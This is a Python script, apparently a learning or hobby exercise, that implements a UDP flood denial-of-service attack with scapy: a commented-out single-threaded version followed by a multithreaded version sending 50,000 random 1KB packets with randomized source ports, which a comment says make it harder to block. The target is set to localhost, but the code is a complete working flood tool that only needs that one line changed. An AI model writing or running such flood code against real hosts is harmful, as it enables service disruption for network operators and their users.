# from scapy.all import IP, UDP, send, RandShort
# import time
# import sys

# # --- Configuration ---
# target_ip = "127.0.0.1"  # Target is your own machine (localhost)
# target_port = 80         # A common port like HTTP
# packet_count = 0

# print(f"🚀 Starting UDP Flood against {target_ip}:{target_port}.")
# print("Press Ctrl+C to stop the attack.")

# # --- The Attack Loop ---
# while True:
#     try:
#         # Craft a packet with a random source port to make it harder to block
#         packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / "ATTACK_PAYLOAD"
        
#         # Send the packet without printing anything to the screen
#         send(packet, verbose=0)
        
#         packet_count += 1
#         # Print status update every 100 packets
#         sys.stdout.write(f"\rPackets Sent: {packet_count}")
#         sys.stdout.flush()

#     except KeyboardInterrupt:
#         print("\n🛑 UDP Flood stopped.")
#         break

import threading
import random
import socket
from scapy.all import IP, UDP, send, RandShort
import sys

# --- Configuration ---
TARGET_IP = "127.0.0.1"  # Your own machine (localhost)
NUM_PACKETS_TO_SEND = 50000  # Total number of packets to send
NUM_THREADS = 10  # Number of threads to use for the attack

# Global counter for packets sent
packets_sent = 0
packets_lock = threading.Lock()

def flood():
    """The function each thread will run to send packets."""
    global packets_sent
    payload = random._urandom(1024)  # Create a random 1KB payload

    while packets_sent < NUM_PACKETS_TO_SEND:
        try:
            # Randomize source and destination ports
            source_port = RandShort()
            dest_port = random.randint(1024, 65535)

            # Craft the packet
            packet = IP(dst=TARGET_IP) / UDP(sport=source_port, dport=dest_port) / payload

            # Send the packet
            send(packet, verbose=0)

            # Safely increment the counter
            with packets_lock:
                packets_sent += 1
                # Print status without creating a new line each time
                sys.stdout.write(f"\rPackets Sent: {packets_sent}/{NUM_PACKETS_TO_SEND}")
                sys.stdout.flush()

        except Exception as e:
            # Handle potential errors without stopping the script
            # print(f"Error: {e}") # Uncomment for debugging
            pass

def main():
    """Main function to start the flood."""
    print(f"🚀 Starting enhanced UDP Flood on {TARGET_IP} with {NUM_THREADS} threads.")
    print(f"Targeting to send {NUM_PACKETS_TO_SEND} packets...")

    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=flood)
        thread.daemon = True  # Allows main program to exit even if threads are still running
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete (or for the packet count to be reached)
    for thread in threads:
        thread.join(timeout=(NUM_PACKETS_TO_SEND / 1000)) # Set a reasonable timeout

    print(f"\n\n🛑 Flood finished. Sent approximately {packets_sent} packets.")

if __name__ == "__main__":
    main()